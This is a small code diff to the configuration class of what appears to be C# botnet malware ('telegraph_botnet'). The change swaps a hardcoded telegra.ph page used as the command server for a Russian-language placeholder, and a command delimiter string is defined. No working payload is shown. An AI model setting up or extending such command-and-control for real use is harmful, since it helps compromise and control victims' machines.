@@ -8,7 +8,7 @@ namespace telegraph_botnet
 {
     internal class config
     {
-        public static string server = "https://telegra.ph/botnet-C-01-15";
+        public static string server = "Ваш адрес до URL страници поста на telegra.ph";
 
         public static string spliter = "{split}";
 
